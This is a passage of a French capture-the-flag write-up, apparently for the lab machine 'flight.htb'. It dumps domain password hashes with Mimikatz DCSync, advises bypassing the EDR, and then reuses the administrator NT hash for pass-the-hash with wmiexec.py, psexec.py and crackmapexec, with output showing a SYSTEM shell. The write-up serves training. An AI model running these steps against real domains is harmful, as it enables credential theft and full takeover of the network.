---
public: true # set to true to make the article publishable
---

## dump de la base NTDS.DIT

Penser à bypasser l'EDR en place !!

- On upload `Mimikatz.exe`
- On exécute ensuite : `mimikatz.exe "lsadump::dcsync /domain:flight.htb /all /csv"`
![[Flight-13.png]]

### Vérification des accès

Grace à ces hashes collectés, nous pourrons nous reconnecter via l'attaque *Pass The Hash* à distance à la machine en tant qu'administrateur du domaine, sans disposer du mot de passe de cet utilisateur :

```shell title="Utilisation du Hash NT récupéré avec wmiexec.py"
$ wmiexec.py  -hashes :43bbfc530bab76141b12c8446e30c17c -dc-ip $TARGET_IP flight.htb/Administrator@$TARGET_IP whoami
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
flight\administrator
```

```shell title="Utilisation du Hash NT récupéré avec psexec.py"
$ psexec.py Administrator@$TARGET_IP -hashes :43bbfc530bab76141b12c8446e30c17c
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.11.187.....
[*] Found writable share ADMIN$
[*] Uploading file BVTQqKla.exe
[*] Opening SVCManager on 10.10.11.187.....
[*] Creating service gxjC on 10.10.11.187.....
[*] Starting service gxjC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```shell title="Utilisation du Hash NT récupéré avec crackmapexec"
└─$ cme smb $TARGET_IP -u Administrator -H 43bbfc530bab76141b12c8446e30c17c --shares | cut -c60-
      [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
      [+] flight.htb\Administrator:43bbfc530bab76141b12c8446e30c17c (Pwn3d!)
      [+] Enumerated shares
      Share           Permissions     Remark
      -----           -----------     ------
      ADMIN$          READ,WRITE      Remote Admin
      C$              READ,WRITE      Default share
      IPC$            READ            Remote IPC
      NETLOGON        READ,WRITE      Logon server share 
      Shared          READ            
      SYSVOL          READ            Logon server share 
      Users           READ            
      Web             READ            
```
